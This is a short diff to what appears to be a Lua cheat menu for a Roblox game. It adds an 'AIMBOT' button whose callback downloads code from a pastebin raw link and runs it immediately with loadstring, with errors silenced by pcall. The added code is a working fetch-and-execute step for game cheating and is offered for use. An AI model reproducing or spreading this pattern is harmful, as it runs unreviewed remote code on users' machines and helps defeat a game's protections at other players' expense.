@@ -182,3 +182,14 @@ Tab:CreateButton({
         end)
     end
 })
+-- boton no effects
+Tab:CreateButton({
+    Name = "AIMBOT",
+    Callback = function()
+        pcall(function()
+            loadstring(game:HttpGet(
+                "https://pastebin.com/raw/CgiJB7mR"
+            ))()
+        end)
+    end
+})
